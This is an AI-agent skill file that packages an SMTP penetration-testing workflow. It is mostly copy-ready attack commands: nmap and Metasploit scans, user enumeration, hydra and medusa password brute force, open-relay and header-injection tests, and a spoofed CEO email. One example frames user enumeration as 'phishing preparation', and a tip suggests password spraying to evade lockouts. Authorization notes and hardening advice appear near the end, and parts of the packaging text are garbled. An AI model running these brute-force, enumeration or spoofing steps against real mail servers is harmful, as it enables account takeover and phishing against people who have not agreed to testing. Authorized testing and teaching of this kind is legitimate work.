---
name: smtp-penetration-testing-v2
description: "SMTP Penetration Testing workflow skill. Use this skill when the user needs Conduct comprehensive security assessments of SMTP (Simple Mail Transfer Protocol) servers to identify vulnerabilities including open relays, user enumeration, weak authentication, and misconfiguration and the operator should rely on the packaged workflow, support pack, troubleshooting notes, and provenance links before merging or handing off."
version: "0.0.1"
category: testing-security
tags: ["smtp-penetration-testing-v2", "smtp-penetration-testing", "conduct", "comprehensive", "security", "assessments", "smtp", "simple"]
complexity: advanced
risk: caution
tools: ["codex-cli", "claude-code", "cursor", "gemini-cli", "opencode"]
source: community
author: "zebbern"
date_added: "2026-04-13"
date_updated: "2026-04-13"
---

# SMTP Penetration Testing

## Overview

This public intake copy packages `plugins/antigravity-awesome-skills/skills/smtp-penetration-testing` from `https://github.com/sickn33/antigravity-awesome-skills` into the native Omni Skills editorial shape without hiding its origin.

Use it when the operator needs the upstream workflow, support files, and repository context to stay intact while the public validator and private enhancer continue their normal downstream flow.

The packaged support pack adds a checklist, rubric, playbook, prompt template, router note, and source manifest so reviewers can audit the import as a complete workflow kit instead of a raw file dump.

> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments. # SMTP Penetration Testing

Imported source sections that did not map cleanly to the public headings are still preserved below or in the support files. Notable imported sections: Purpose, Prerequisites, Outputs and Deliverables, Constraints and Limitations, Security Recommendations.

## When to Use This Skill

Use this section as the trigger filter. It should make the activation boundary explicit before the operator loads files, runs commands, or opens a pull request.

- This skill is applicable to execute the workflow or actions described in the overview.
- Use when the request clearly matches the imported source intent: Conduct comprehensive security assessments of SMTP (Simple Mail Transfer Protocol) servers to identify vulnerabilities including open relays, user enumeration, weak authentication, and misconfiguration.
- Use when the operator should preserve upstream workflow detail instead of rewriting the process from scratch.
- Use when provenance needs to stay visible in the answer, PR, or review packet.
- Use when the support pack, checklist, rubric, and playbook should guide execution before touching code or tools.
- Use when the workflow should remain reviewable in the public intake repo before the private enhancer takes over.

## Operating Table

| Situation | Start here | Why it matters |
| --- | --- | --- |
| First-time use | `references/omni-import-playbook.md` | Establishes the workflow, review packet, and provenance expectations before work begins |
| PR review or merge readiness | `references/omni-import-rubric.md` | Turns the imported skill into a checklist-driven review packet instead of an opaque file copy |
| Source or lineage verification | `scripts/omni_import_print_origin.py` | Confirms repository, branch, commit, and imported path quickly |
| Workflow execution | `references/omni-import-checklist.md` | Gives the operator the smallest useful entry point into the support pack |
| Handoff decision | `agents/omni-import-router.md` | Helps the operator switch to a stronger native skill when the task drifts |

## Workflow

This workflow is intentionally editorial and operational at the same time. It keeps the imported source useful to the operator while still satisfying the public intake standards that feed the downstream enhancer flow.

1. Server software (Postfix, Sendmail, Exchange)
2. Version information
3. Hostname
4. Supported SMTP extensions (STARTTLS, AUTH, etc.)
5. Confirm the user goal, the scope of the imported workflow, and whether this skill is still the right router for the task.
6. Read the overview, playbook, and source summary before loading any upstream support files.
7. Load only the references, examples, prompts, or scripts that materially change the outcome for the current request.

### Imported Workflow Notes

#### Imported: Core Workflow

### Phase 1: SMTP Architecture Understanding

```
Components: MTA (transfer) → MDA (delivery) → MUA (client)

Ports: 25 (SMTP), 465 (SMTPS), 587 (submission), 2525 (alternative)

Workflow: Sender MUA → Sender MTA → DNS/MX → Recipient MTA → MDA → Recipient MUA
```

### Phase 2: SMTP Service Discovery

Identify SMTP servers and versions:

```bash
# Discover SMTP ports
nmap -p 25,465,587,2525 -sV TARGET_IP

# Aggressive service detection
nmap -sV -sC -p 25 TARGET_IP

# SMTP-specific scripts
nmap --script=smtp-* -p 25 TARGET_IP

# Discover MX records for domain
dig MX target.com
nslookup -type=mx target.com
host -t mx target.com
```

### Phase 3: Banner Grabbing

Retrieve SMTP server information:

```bash
# Using Telnet
telnet TARGET_IP 25
# Response: 220 mail.target.com ESMTP Postfix

# Using Netcat
nc TARGET_IP 25
# Response: 220 mail.target.com ESMTP

# Using Nmap
nmap -sV -p 25 TARGET_IP
# Version detection extracts banner info

# Manual SMTP commands
EHLO test
# Response reveals supported extensions
```

Parse banner information:

```
Banner reveals:
- Server software (Postfix, Sendmail, Exchange)
- Version information
- Hostname
- Supported SMTP extensions (STARTTLS, AUTH, etc.)
```

### Phase 4: SMTP Command Enumeration

Test available SMTP commands:

```bash
# Connect and test commands
nc TARGET_IP 25

# Initial greeting
EHLO attacker.com

# Response shows capabilities:
250-mail.target.com
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-AUTH PLAIN LOGIN
250-8BITMIME
250 DSN
```

Key commands to test:

```bash
# VRFY - Verify user exists
VRFY admin
250 2.1.5 admin@target.com

# EXPN - Expand mailing list
EXPN staff
250 2.1.5 user1@target.com
250 2.1.5 user2@target.com

# RCPT TO - Recipient verification
MAIL FROM:<test@attacker.com>
RCPT TO:<admin@target.com>
# 250 OK = user exists
# 550 = user doesn't exist
```

### Phase 5: User Enumeration

Enumerate valid email addresses:

```bash
# Using smtp-user-enum with VRFY
smtp-user-enum -M VRFY -U /usr/share/wordlists/users.txt -t TARGET_IP

# Using EXPN method
smtp-user-enum -M EXPN -U /usr/share/wordlists/users.txt -t TARGET_IP

# Using RCPT method
smtp-user-enum -M RCPT -U /usr/share/wordlists/users.txt -t TARGET_IP

# Specify port and domain
smtp-user-enum -M VRFY -U users.txt -t TARGET_IP -p 25 -d target.com
```

Using Metasploit:

```bash
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS TARGET_IP
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set UNIXONLY true
run
```

Using Nmap:

```bash
# SMTP user enumeration script
nmap --script smtp-enum-users -p 25 TARGET_IP

# With custom user list
nmap --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -p 25 TARGET_IP
```

### Phase 6: Open Relay Testing

Test for unauthorized email relay:

```bash
# Using Nmap
nmap -p 25 --script smtp-open-relay TARGET_IP

# Manual testing via Telnet
telnet TARGET_IP 25
HELO attacker.com
MAIL FROM:<test@attacker.com>
RCPT TO:<victim@external-domain.com>
DATA
Subject: Relay Test
This is a test.
.
QUIT

# If accepted (250 OK), server is open relay
```

Using Metasploit:

```bash
use auxiliary/scanner/smtp/smtp_relay
set RHOSTS TARGET_IP
run
```

Test variations:

```bash
# Test different sender/recipient combinations
MAIL FROM:<>
MAIL FROM:<test@[attacker_IP]>
MAIL FROM:<test@target.com>

RCPT TO:<test@external.com>
RCPT TO:<"test@external.com">
RCPT TO:<test%external.com@target.com>
```

### Phase 7: Brute Force Authentication

Test for weak SMTP credentials:

```bash
# Using Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt smtp://TARGET_IP

# With specific port and SSL
hydra -l admin -P passwords.txt -s 465 -S TARGET_IP smtp

# Multiple users
hydra -L users.txt -P passwords.txt TARGET_IP smtp

# Verbose output
hydra -l admin -P passwords.txt smtp://TARGET_IP -V
```

Using Medusa:

```bash
medusa -h TARGET_IP -u admin -P /path/to/passwords.txt -M smtp
```

Using Metasploit:

```bash
use auxiliary/scanner/smtp/smtp_login
set RHOSTS TARGET_IP
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
set VERBOSE true
run
```

### Phase 8: SMTP Command Injection

Test for command injection vulnerabilities:

```bash
# Header injection test
MAIL FROM:<attacker@test.com>
RCPT TO:<victim@target.com>
DATA
Subject: Test
Bcc: hidden@attacker.com
X-Injected: malicious-header

Injected content
.
```

Email spoofing test:

```bash
# Spoofed sender (tests SPF/DKIM protection)
MAIL FROM:<ceo@target.com>
RCPT TO:<employee@target.com>
DATA
From: CEO <ceo@target.com>
Subject: Urgent Request
Please process this request immediately.
.
```

### Phase 9: TLS/SSL Security Testing

Test encryption configuration:

```bash
# STARTTLS support check
openssl s_client -connect TARGET_IP:25 -starttls smtp

# Direct SSL (port 465)
openssl s_client -connect TARGET_IP:465

# Cipher enumeration
nmap --script ssl-enum-ciphers -p 25 TARGET_IP
```

### Phase 10: SPF, DKIM, DMARC Analysis

Check email authentication records:

```bash
# SPF/DKIM/DMARC record lookups
dig TXT target.com | grep spf            # SPF
dig TXT selector._domainkey.target.com    # DKIM
dig TXT _dmarc.target.com                 # DMARC

# SPF policy: -all = strict fail, ~all = soft fail, ?all = neutral
```

#### Imported: Purpose

Conduct comprehensive security assessments of SMTP (Simple Mail Transfer Protocol) servers to identify vulnerabilities including open relays, user enumeration, weak authentication, and misconfiguration. This skill covers banner grabbing, user enumeration techniques, relay testing, brute force attacks, and security hardening recommendations.

## Examples

### Example 1: Ask for the upstream workflow directly

```text
Use @smtp-penetration-testing-v2 to handle <task>. Start with the workflow playbook, load only the upstream files that change the outcome, and keep provenance visible in the answer.
```

**Explanation:** This is the safest starting point when the operator needs the imported workflow, but not the entire repository.

### Example 2: Inspect origin and import state

```bash
python3 skills/smtp-penetration-testing-v2/scripts/omni_import_print_origin.py
```

**Explanation:** Use this before review or troubleshooting when you need to confirm source repository, branch, commit, and path.

### Example 3: Review the support pack before execution

```bash
python3 skills/smtp-penetration-testing-v2/scripts/omni_import_list_support_pack.py
```

**Explanation:** This gives the operator a quick inventory of the imported references, examples, scripts, router notes, and manifest files.

### Example 4: Build a reviewer packet

```text
Review @smtp-penetration-testing-v2 using the checklist, rubric, playbook, and source manifest, then summarize any gaps before merge.
```

**Explanation:** This is useful when the PR is waiting for human review and you want a repeatable audit packet.

### Imported Usage Notes

#### Imported: Examples

### Example 1: Complete SMTP Assessment

**Scenario:** Full security assessment of mail server

```bash
# Step 1: Service discovery
nmap -sV -sC -p 25,465,587 mail.target.com

# Step 2: Banner grab
nc mail.target.com 25
EHLO test.com
QUIT

# Step 3: User enumeration
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t mail.target.com

# Step 4: Open relay test
nmap -p 25 --script smtp-open-relay mail.target.com

# Step 5: Authentication test
hydra -l admin -P /usr/share/wordlists/fasttrack.txt smtp://mail.target.com

# Step 6: TLS check
openssl s_client -connect mail.target.com:25 -starttls smtp

# Step 7: Check email authentication
dig TXT target.com | grep spf
dig TXT _dmarc.target.com
```

### Example 2: User Enumeration Attack

**Scenario:** Enumerate valid users for phishing preparation

```bash
# Method 1: VRFY
smtp-user-enum -M VRFY -U users.txt -t 192.168.1.100 -p 25

# Method 2: RCPT with timing analysis
smtp-user-enum -M RCPT -U users.txt -t 192.168.1.100 -p 25 -d target.com

# Method 3: Metasploit
msfconsole
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
run

# Results show valid users
[+] 192.168.1.100:25 - Found user: admin
[+] 192.168.1.100:25 - Found user: root
[+] 192.168.1.100:25 - Found user: postmaster
```

### Example 3: Open Relay Exploitation

**Scenario:** Test and document open relay vulnerability

```bash
# Test via Telnet
telnet mail.target.com 25
HELO attacker.com
MAIL FROM:<test@attacker.com>
RCPT TO:<test@gmail.com>
# If 250 OK - VULNERABLE

# Document with Nmap
nmap -p 25 --script smtp-open-relay --script-args smtp-open-relay.from=test@attacker.com,smtp-open-relay.to=test@external.com mail.target.com

# Output:
# PORT   STATE SERVICE
# 25/tcp open  smtp
# |_smtp-open-relay: Server is an open relay (14/16 tests)
```

## Best Practices

Treat the generated public skill as a reviewable packaging layer around the upstream repository. The checklist, rubric, worksheet, template, and playbook are there to make the import auditable, not to hide the source material.

- Keep the imported skill grounded in the upstream repository; do not invent steps that the source material cannot support.
- Prefer the smallest useful set of support files so the workflow stays auditable and fast to review.
- Keep provenance, source commit, and imported file paths visible in notes and PR descriptions.
- Use the checklist, rubric, worksheet, and playbook together instead of relying on a single section in isolation.
- Treat generated examples as scaffolding; adapt them to the concrete task before execution.
- Route to a stronger native skill when architecture, debugging, design, or security concerns become dominant.



## Troubleshooting

### Problem: The operator skipped the imported context and answered too generically

**Symptoms:** The result ignores the upstream workflow in `plugins/antigravity-awesome-skills/skills/smtp-penetration-testing`, fails to mention provenance, or does not use the support pack at all.
**Solution:** Re-open the checklist, playbook, source summary, and source manifest. Load only the upstream files that materially change the answer, then restate the provenance before continuing.

### Problem: The imported workflow feels incomplete during review

**Symptoms:** Reviewers can see the generated `SKILL.md`, but they cannot quickly tell which references, examples, or scripts matter for the current task.
**Solution:** Use the operator packet and support-pack listing to point at the exact references, examples, scripts, and router notes that justify the path you took. If the gap is still real, record it in the PR instead of hiding it.

### Problem: The task drifted into a different specialization

**Symptoms:** The imported skill starts in the right place, but the work turns into debugging, architecture, design, security, or release orchestration that a native skill handles better.
**Solution:** Use the router note and related skills section to hand off deliberately. Keep the imported provenance visible so the next skill inherits the right context instead of starting blind.

### Imported Troubleshooting Notes

#### Imported: Troubleshooting

| Issue | Cause | Solution |
|-------|-------|----------|
| Connection Refused | Port blocked or closed | Check port with nmap; ISP may block port 25; try 587/465; use VPN |
| VRFY/EXPN Disabled | Server hardened | Use RCPT TO method; analyze response time/code variations |
| Brute Force Blocked | Rate limiting/lockout | Slow down (`hydra -W 5`); use password spraying; check for fail2ban |
| SSL/TLS Errors | Wrong port or protocol | Use 465 for SSL, 25/587 for STARTTLS; verify EHLO response |

## Related Skills

- `@00-andruia-consultant` - Use when the work is better handled by that native specialization after this imported skill establishes context.
- `@00-andruia-consultant-v2` - Use when the work is better handled by that native specialization after this imported skill establishes context.
- `@10-andruia-skill-smith` - Use when the work is better handled by that native specialization after this imported skill establishes context.
- `@10-andruia-skill-smith-v2` - Use when the work is better handled by that native specialization after this imported skill establishes context.

## Additional Resources

Use this support matrix and the linked files below as the operational packet for this imported skill. Together they provide the checklist, rubric, template, playbook, router guidance, and manifest that the validator expects to see represented in the public skill.

| Resource family | What it gives the reviewer | Example path |
| --- | --- | --- |
| `references` | checklists, rubrics, playbooks, and source summaries | `references/omni-import-checklist.md` |
| `examples` | prompt packets and usage templates | `examples/omni-import-operator-packet.md` |
| `scripts` | origin inspection and support-pack listing | `scripts/omni_import_list_support_pack.py` |
| `agents` | routing and handoff guidance | `agents/omni-import-router.md` |
| `assets` | machine-readable source manifest | `assets/omni-import-source-manifest.json` |

- [Imported intake checklist](references/omni-import-checklist.md)
- [Imported review rubric](references/omni-import-rubric.md)
- [Imported workflow playbook](references/omni-import-playbook.md)
- [Imported source summary](references/omni-import-source-summary.md)
- [Imported operator packet](examples/omni-import-operator-packet.md)
- [Imported prompt template](examples/omni-import-prompt-template.md)
- [Print origin details](scripts/omni_import_print_origin.py)
- [List support pack](scripts/omni_import_list_support_pack.py)

### Imported Reference Notes

#### Imported: Quick Reference

### Essential SMTP Commands

| Command | Purpose | Example |
|---------|---------|---------|
| HELO | Identify client | `HELO client.com` |
| EHLO | Extended HELO | `EHLO client.com` |
| MAIL FROM | Set sender | `MAIL FROM:<sender@test.com>` |
| RCPT TO | Set recipient | `RCPT TO:<user@target.com>` |
| DATA | Start message body | `DATA` |
| VRFY | Verify user | `VRFY admin` |
| EXPN | Expand alias | `EXPN staff` |
| QUIT | End session | `QUIT` |

### SMTP Response Codes

| Code | Meaning |
|------|---------|
| 220 | Service ready |
| 221 | Closing connection |
| 250 | OK / Requested action completed |
| 354 | Start mail input |
| 421 | Service not available |
| 450 | Mailbox unavailable |
| 550 | User unknown / Mailbox not found |
| 553 | Mailbox name not allowed |

### Enumeration Tool Commands

| Tool | Command |
|------|---------|
| smtp-user-enum | `smtp-user-enum -M VRFY -U users.txt -t IP` |
| Nmap | `nmap --script smtp-enum-users -p 25 IP` |
| Metasploit | `use auxiliary/scanner/smtp/smtp_enum` |
| Netcat | `nc IP 25` then manual commands |

### Common Vulnerabilities

| Vulnerability | Risk | Test Method |
|--------------|------|-------------|
| Open Relay | High | Relay test with external recipient |
| User Enumeration | Medium | VRFY/EXPN/RCPT commands |
| Banner Disclosure | Low | Banner grabbing |
| Weak Auth | High | Brute force attack |
| No TLS | Medium | STARTTLS test |
| Missing SPF/DKIM | Medium | DNS record lookup |

#### Imported: Prerequisites

### Required Tools
```bash
# Nmap with SMTP scripts
sudo apt-get install nmap

# Netcat
sudo apt-get install netcat

# Hydra for brute force
sudo apt-get install hydra

# SMTP user enumeration tool
sudo apt-get install smtp-user-enum

# Metasploit Framework
msfconsole
```

### Required Knowledge
- SMTP protocol fundamentals
- Email architecture (MTA, MDA, MUA)
- DNS and MX records
- Network protocols

### Required Access
- Target SMTP server IP/hostname
- Written authorization for testing
- Wordlists for enumeration and brute force

#### Imported: Outputs and Deliverables

1. **SMTP Security Assessment Report** - Comprehensive vulnerability findings
2. **User Enumeration Results** - Valid email addresses discovered
3. **Relay Test Results** - Open relay status and exploitation potential
4. **Remediation Recommendations** - Security hardening guidance

#### Imported: Constraints and Limitations

### Legal Requirements
- Only test SMTP servers you own or have authorization to test
- Sending spam or malicious emails is illegal
- Document all testing activities
- Do not abuse discovered open relays

### Technical Limitations
- VRFY/EXPN often disabled on modern servers
- Rate limiting may slow enumeration
- Some servers respond identically for valid/invalid users
- Greylisting may delay enumeration responses

### Ethical Boundaries
- Never send actual spam through discovered relays
- Do not harvest email addresses for malicious use
- Report open relays to server administrators
- Use findings only for authorized security improvement

#### Imported: Security Recommendations

### For Administrators

1. **Disable Open Relay** - Require authentication for external delivery
2. **Disable VRFY/EXPN** - Prevent user enumeration
3. **Enforce TLS** - Require STARTTLS for all connections
4. **Implement SPF/DKIM/DMARC** - Prevent email spoofing
5. **Rate Limiting** - Prevent brute force attacks
6. **Account Lockout** - Lock accounts after failed attempts
7. **Banner Hardening** - Minimize server information disclosure
8. **Log Monitoring** - Alert on suspicious activity
9. **Patch Management** - Keep SMTP software updated
10. **Access Controls** - Restrict SMTP to authorized IPs
